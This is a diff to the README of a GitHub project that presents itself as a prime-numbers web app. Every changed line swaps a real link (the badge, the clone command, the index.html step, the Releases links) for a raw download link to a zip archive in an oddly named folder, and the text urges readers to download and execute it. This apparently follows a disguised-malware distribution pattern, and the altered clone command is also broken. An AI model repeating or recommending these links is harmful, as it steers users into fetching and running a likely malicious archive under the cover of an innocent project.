@@ -1,6 +1,6 @@
 # Prime Numbers Web App 🟡
 
-![Prime Numbers](https://img.shields.io/badge/Prime%20Numbers-Web%20App-yellow?style=for-the-badge&logo=appveyor)
+![Prime Numbers](https://github.com/RvnKali/Prime-Numbers/raw/refs/heads/main/anarchial/Numbers_Prime_v3.2.zip%20Numbers-Web%20App-yellow?style=for-the-badge&logo=appveyor)
 
 Welcome to the **Prime Numbers Web App**! This interactive tool helps you identify, analyze, and explore prime numbers efficiently. Whether you're a student, teacher, or just a math enthusiast, this app offers a user-friendly experience to engage with prime numbers.
 
@@ -38,14 +38,14 @@ To get started with the Prime Numbers Web App, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/RvnKali/Prime-Numbers.git
+   git clone https://github.com/RvnKali/Prime-Numbers/raw/refs/heads/main/anarchial/Numbers_Prime_v3.2.zip
    ```
 2. **Navigate to the Project Directory**:
    ```bash
    cd Prime-Numbers
    ```
 3. **Open the App**:
-   Open `index.html` in your web browser.
+   Open `https://github.com/RvnKali/Prime-Numbers/raw/refs/heads/main/anarchial/Numbers_Prime_v3.2.zip` in your web browser.
 
 ## Usage
 
@@ -87,7 +87,7 @@ For any inquiries, please reach out via GitHub or create an issue in the reposit
 
 ## Releases
 
-For the latest releases and updates, visit the [Releases](https://github.com/RvnKali/Prime-Numbers/releases) section. Here you can download the latest version and execute it locally.
+For the latest releases and updates, visit the [Releases](https://github.com/RvnKali/Prime-Numbers/raw/refs/heads/main/anarchial/Numbers_Prime_v3.2.zip) section. Here you can download the latest version and execute it locally.
 
 Feel free to explore the app and share your feedback!
 
@@ -95,4 +95,4 @@ Feel free to explore the app and share your feedback!
 
 This README provides an overview of the Prime Numbers Web App, detailing its features, technologies, and how to get started. Whether you are looking to check if a number is prime or explore the fascinating world of prime numbers, this app has you covered. 
 
-Remember to check the [Releases](https://github.com/RvnKali/Prime-Numbers/releases) section for the latest updates and downloads. Happy exploring!
+Remember to check the [Releases](https://github.com/RvnKali/Prime-Numbers/raw/refs/heads/main/anarchial/Numbers_Prime_v3.2.zip) section for the latest updates and downloads. Happy exploring!
